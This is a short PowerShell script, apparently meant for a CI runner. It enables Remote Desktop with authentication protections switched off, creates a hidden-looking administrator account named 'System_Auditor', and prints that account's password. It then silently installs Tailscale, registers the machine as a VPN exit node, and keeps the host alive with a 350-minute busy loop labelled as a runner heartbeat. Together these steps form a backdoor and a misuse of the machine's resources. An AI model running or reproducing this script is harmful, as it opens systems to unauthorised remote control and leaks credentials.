$p1 = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
$p2 = "WinStations\RDP-Tcp"
$path = Join-Path $p1 $p2
Set-ItemProperty -Path $p1 -Name "fDenyTSConnections" -Value 0 -Force
Set-ItemProperty -Path $path -Name "UserAuthentication" -Value 0 -Force
Set-ItemProperty -Path $path -Name "SecurityLayer" -Value 0 -Force
$u = "System_Auditor"
$p = "Build_$(Get-Random -Max 9999)!"
$s = ConvertTo-SecureString $p -AsPlainText -Force
New-LocalUser -Name $u -Password $s -AccountNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $u
Write-Host "AUTH_EXPORT: $u : $p"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 1 -Force
$msi = "$env:TEMP$(Get-Random).msi"
(New-Object Net.WebClient).DownloadFile("https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi", $msi)
Start-Process msiexec.exe -ArgumentList "/i", "`"$msi`"", "TS_ADVERTISEEXITNODE=always", "/quiet", "/norestart" -Wait
$ts = "$env:ProgramFiles\Tailscale\tailscale.exe"
if (!(Test-Path $ts)) { exit 1 }
Stop-Service tailscale -Force -ErrorAction SilentlyContinue
Start-Service tailscale
Start-Sleep -Seconds 10
netsh interface ipv4 set interface "Tailscale" forwarding=enabled
netsh interface ipv6 set interface "Tailscale" forwarding=enabled
$key = $env:TS_KEY
& $ts up --authkey=$key --hostname="worker-$(Get-Random -Max 999)" --advertise-exit-node --advertise-tags=tag:runner --reset --force-reauth --accept-routes --accept-dns=false
$limit = (Get-Date).AddMinutes(350)
while ((Get-Date) -lt $limit) {
Write-Host "[$(Get-Date)] Heartbeat: Runner active"
$x = 0; for($i=0; $i -lt 500000; $i++) { $x += $i }
Start-Sleep -Seconds 30
}
